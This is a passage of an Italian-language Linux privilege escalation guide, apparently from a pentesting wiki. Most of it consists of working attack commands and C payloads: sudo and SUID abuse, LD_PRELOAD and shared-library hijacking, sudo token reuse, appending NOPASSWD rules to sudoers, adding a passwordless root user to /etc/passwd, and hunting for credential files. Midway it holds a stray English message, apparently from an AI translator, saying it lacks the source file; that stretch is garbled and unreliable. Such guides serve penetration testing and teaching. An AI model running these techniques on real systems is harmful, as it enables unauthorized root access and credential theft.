#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grandi

Alcune versioni di Linux sono state colpite da un bug che permette agli utenti con **UID > INT_MAX** di ottenere l'elevazione dei privilegi. Maggiori info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Sfruttalo** usando: **`systemd-run -t /bin/bash`**

### Gruppi

Controlla se sei **membro di qualche gruppo** che potrebbe concederti privilegi root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Appunti

Controlla se c'è qualcosa di interessante negli appunti (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politica delle password
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Password conosciute

Se **conosci qualche password** dell'ambiente **prova a effettuare il login come ogni utente** usando quella password.

### Su Brute

Se non ti dispiace generare molto rumore e i binari `su` e `timeout` sono presenti sulla macchina, puoi provare a effettuare un brute-force sugli utenti usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` prova anche a effettuare un brute-force sugli utenti.

## Abusi del PATH scrivibile

### $PATH

Se scopri di poter **scrivere in qualche cartella del $PATH** potresti essere in grado di escalate privileges creando **una backdoor nella cartella scrivibile** con il nome di un comando che verrà eseguito da un altro utente (idealmente root) e che **non venga caricato da una cartella che si trovi prima** della tua cartella scrivibile nel $PATH.

### SUDO and SUID

Potresti essere autorizzato a eseguire alcuni comandi usando sudo oppure alcuni binari potrebbero avere il bit suid. Controllalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi inaspettati consentono di leggere e/o scrivere file o perfino eseguire un comando.** Ad esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di sudo potrebbe permettere a un utente di eseguire un comando con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In questo esempio l'utente `demo` può eseguire `vim` come `root`; ora è banale ottenere una shell aggiungendo una chiave ssh nella directory `root` o eseguendo `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva permette all'utente di **impostare una variabile d'ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerable** a **PYTHONPATH hijacking** per caricare una libreria python arbitraria mentre lo script veniva eseguito come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservato tramite sudo env_keep → shell root

Se sudoers preserva `BASH_ENV` (es., `Defaults env_keep+="ENV BASH_ENV"`), puoi sfruttare il comportamento di avvio non interattivo di Bash per eseguire codice arbitrario come root quando invochi un comando consentito.

- Perché funziona: per le shell non interattive, Bash valuta `$BASH_ENV` e esegue il source di quel file prima di eseguire lo script di destinazione. Molte regole sudo permettono di eseguire uno script o un wrapper di shell. Se `BASH_ENV` è preservato da sudo, il tuo file viene sourcato con privilegi di root.

- Requisiti:
- Una regola sudo che puoi eseguire (qualsiasi target che invoca `/bin/bash` in modo non interattivo, o qualsiasi bash script).
- `BASH_ENV` presente in `env_keep` (verifica con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Rimuovere `BASH_ENV` (e `ENV`) da `env_keep`, preferire `env_reset`.
- Evitare wrapper di shell per i comandi consentiti da sudo; usare binari minimi.
- Considerare il logging I/O di sudo e gli alert quando vengono usate variabili d'ambiente preservate.

### Percorsi per bypassare l'esecuzione con sudo

**Jump** per leggere altri file o usare **symlinks**. Ad esempio nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene usato un **wildcard** (\*), è ancora più semplice:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary senza specificare il percorso del comando

Se la **sudo permission** è concessa per un singolo comando **senza specificare il percorso**: _hacker10 ALL= (root) less_ puoi sfruttarlo modificando la variabile PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può anche essere usata se un **suid** binary **esegue un altro comando senza specificarne il percorso (controlla sempre con** _**strings**_ **il contenuto di un SUID binary sospetto)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary con percorso del comando

Se il **suid** binary **esegue un altro comando specificando il percorso**, allora puoi provare a **export a function** chiamata come il comando che il suid file sta invocando.

Ad esempio, se un **suid** binary richiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione e esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Quindi, quando esegui il binario suid, questa funzione verrà eseguita

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variabile d'ambiente **LD_PRELOAD** viene usata per specificare una o più shared libraries (.so files) da caricare dal loader prima di tutte le altre, inclusa la standard C library (`libc.so`). Questo processo è noto come preloading di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e prevenire lo sfruttamento di questa funzionalità, specialmente con eseguibili **suid/sgid**, il sistema impone certe condizioni:

- Il loader ignora **LD_PRELOAD** per gli eseguibili in cui il real user ID (_ruid_) non corrisponde all'effective user ID (_euid_).
- Per gli eseguibili con suid/sgid, vengono precaricate solo le librerie in percorsi standard che sono anch'essi suid/sgid.

Privilege escalation può verificarsi se hai la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include la dichiarazione **env_keep+=LD_PRELOAD**. Questa configurazione permette alla variabile d'ambiente **LD_PRELOAD** di persistere ed essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, potenzialmente portando all'esecuzione di codice arbitrario con privilegi elevati.
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Quindi **compilalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **escalate privileges** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc simile può essere abusato se l'attaccante controlla la variabile d'ambiente **LD_LIBRARY_PATH** perché controlla il percorso in cui le librerie verranno cercate.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Quando si incontra un binary con permessi **SUID** che sembra insolito, è buona pratica verificare se sta caricando correttamente i file **.so**. Questo può essere controllato eseguendo il seguente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggerisce un potenziale di sfruttamento.

Per sfruttare questo, si procede creando un file C, ad esempio _"/path/to/.config/libcalc.c"_, contenente il codice seguente:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira a elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C sopra in un file oggetto condiviso (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del binario SUID interessato dovrebbe attivare l'exploit, consentendo un potenziale compromesso del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un SUID binary che carica una library da una cartella in cui possiamo scrivere, creiamo la library in quella cartella con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se ricevi un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
ciò significa che la libreria che hai generato deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è una lista curata di binari Unix che possono essere sfruttati da un attaccante per eludere le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso ma per i casi in cui puoi **solo iniettare argomenti** in un comando.

Il progetto raccoglie funzionalità legittime dei binari Unix che possono essere abusate per evadere shell ristrette, effettuare escalation o mantenere privilegi elevati, trasferire file, generare bind e reverse shell, e facilitare altri compiti di post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se puoi eseguire `sudo -l` puoi usare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se trova un modo per sfruttare qualche regola sudo.

### Reusing Sudo Tokens

Nei casi in cui hai **accesso sudo** ma non la password, puoi ottenere l'elevazione dei privilegi aspettando l'esecuzione di un comando sudo e poi dirottando il token di sessione.

Requisiti per elevare i privilegi:

- Hai già una shell come utente "_sampleuser_"
- "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (di default quella è la durata del token sudo che ci permette di usare `sudo` senza inserire nessuna password)
- `cat /proc/sys/kernel/yama/ptrace_scope` è 0
- `gdb` è accessibile (puoi caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` e impostando `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi elevare i privilegi usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Il **primo exploit** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token sudo nella tua sessione** (non otterrai automaticamente una shell root, esegui `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Il **terzo exploit** (`exploit_v3.sh`) **creerà un sudoers file** che rende **i sudo tokens eterni e permette a tutti gli utenti di usare sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se hai i **permessi di scrittura** nella cartella o su uno qualsiasi dei file creati all'interno della cartella, puoi usare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza dover conoscere la password eseguendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file presenti in `/etc/sudoers.d` configurano chi può usare `sudo` e come. Questi file **di default possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** puoi **leggere** questo file potresti riuscire a **ottenere alcune informazioni interessanti**, e se puoi **scrivere** qualsiasi file sarai in grado di **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se puoi scrivere, puoi abusare di questo permesso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per abusare di questi permessi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Esistono alcune alternative al binario `sudo`, come `doas` per OpenBSD. Ricorda di controllare la sua configurazione in `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se sai che un **utente solitamente si connette a una macchina e usa `sudo`** per elevare i privilegi e hai ottenuto una shell nel contesto di quell'utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e poi il comando dell'utente. Poi, **modifica il $PATH** del contesto utente (per esempio aggiungendo il nuovo percorso in .bash_profile) così quando l'utente esegue sudo, il tuo eseguibile sudo verrà eseguito.

Nota che se l'utente usa una shell diversa (non bash) dovrai modificare altri file per aggiungere il nuovo path. Per esempio [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oppure eseguendo qualcosa del tipo:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Libreria condivisa

### ld.so

Il file `/etc/ld.so.conf` indica **da dove vengono caricate le configurazioni**. Tipicamente questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Questo significa che verranno letti i file di configurazione in `/etc/ld.so.conf.d/*.conf`. Questi file di configurazione **puntano ad altre cartelle** in cui verranno **ricercate** le **librerie**. Per esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Questo significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente ha permessi di scrittura** su uno qualsiasi dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualunque cartella indicata da un file di configurazione in `/etc/ld.so.conf.d/*.conf` potrebbe essere in grado di aumentare i privilegi.\
Dai un'occhiata a **come sfruttare questa errata configurazione** nella seguente pagina:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiare la lib in `/var/tmp/flag15/` farà sì che venga usata dal programma in quella posizione, come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacità

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permessi delle directory

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) rappresentano il livello secondario di permessi discrezionali, in grado di **overriding the traditional ugo/rwx permissions**. Questi permessi migliorano il controllo sull'accesso a file o directory permettendo o negando diritti a utenti specifici che non sono i proprietari o parte del gruppo. Questo livello di **granularità assicura una gestione degli accessi più precisa**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Concedi** all'utente "kali" i permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Ottieni** file con ACL specifiche dal sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Apertura di shell sessions

Nelle **vecchie versioni** potresti **hijack** qualche sessione **shell** di un utente diverso (**root**).\
Nelle **nuove versioni** potrai **collegarti** solo alle screen sessions del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.

### screen sessions hijacking

**Elenca screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Collegarsi a una sessione**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Questo era un problema con le vecchie versioni di tmux. Non sono riuscito a hijackare una sessione tmux (v2.1) creata da root come utente non privilegiato.

**Elencare le sessioni tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Collegarsi a una sessione**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** per un esempio.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Questo bug si verifica quando si crea una nuova ssh key in quegli OS, poiché **erano possibili solo 32.768 variazioni**. Questo significa che tutte le possibilità possono essere calcolate e **avendo la ssh public key puoi cercare la corrispondente private key**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the command option is specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Questa configurazione indicherà che se provi a effettuare il login con la chiave **privata** dell'utente "**testusername**", ssh confronterà la chiave pubblica della tua chiave con quelle presenti in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ti permette di **usare le tue SSH keys locali invece di lasciare le chiavi** (senza passphrase!) sul server. In questo modo potrai **collegarti** via ssh **a un host** e da lì **collegarti a un altro** host **usando** la **chiave** presente nel tuo **host iniziale**.

Devi impostare questa opzione in `$HOME/.ssh.config` così:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*`, ogni volta che l'utente si collega a una macchina diversa, quell'host potrà accedere alle chiavi (il che rappresenta un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** ssh-agent forwarding con la parola chiave `AllowAgentForwarding` (di default è consentito).

Se trovi che Forward Agent è configurato in un ambiente, leggi la pagina seguente perché **potresti essere in grado di abusarne per scalare i privilegi**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## File interessanti

### File di profilo

Il file `/etc/profile` e i file sotto `/etc/profile.d/` sono **script che vengono eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno qualsiasi di essi, puoi scalare i privilegi**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato uno script di profilo strano dovresti controllarlo per **dettagli sensibili**.

### Passwd/Shadow Files

A seconda del sistema operativo i file `/etc/passwd` e `/etc/shadow` potrebbero usare un nome diverso o potrebbe esserci un backup. Perciò è consigliato **trovarli tutti** e **verificare se puoi leggerli** per vedere **se ci sono hash** all'interno dei file:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcune occasioni puoi trovare **password hashes** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd scrivibile

Per prima cosa, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the README.md content you want translated.

Also clarify:
- Do you want me to generate a password for the user `hacker`, or will you provide one?
- If I generate a password, do you want it included literally in the translated file (e.g., in a code block or inline), and where should I insert the user/password entry in the README?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Es.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi usare il comando `su` con `hacker:hacker`

In alternativa, puoi usare le seguenti righe per aggiungere un utente dummy senza password.\
ATTENZIONE: potresti degradare la sicurezza attuale della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Sulle piattaforme BSD `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`, inoltre `/etc/shadow` viene rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Ad esempio, puoi scrivere in qualche **file di configurazione di un servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Ad esempio, se la macchina esegue un **tomcat** server e puoi **modify the Tomcat service configuration file inside /etc/systemd/,** allora puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
La tua backdoor verrà eseguita la prossima volta che tomcat verrà avviato.

### Check Folders

Le seguenti cartelle possono contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non riuscirai a leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Posizione strana/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File DB di Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml file
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binari in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **File web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backup**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi possibili file che potrebbero contenere passwords**.\
**Another interesting tool** che puoi usare per questo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source usata per recuperare molte passwords memorizzate su un computer locale per Windows, Linux & Mac.

### Logs

Se puoi leggere i log, potresti riuscire a trovare **informazioni interessanti/confidenziali al loro interno**. Più il log è strano, più sarà interessante (probabilmente).\
Inoltre, alcuni audit logs configurati in modo "**bad**" (backdoored?) potrebbero permetterti di **registrare passwords** all'interno degli audit logs come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per poter **leggere i log il gruppo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sarà davvero utile.

### File di shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
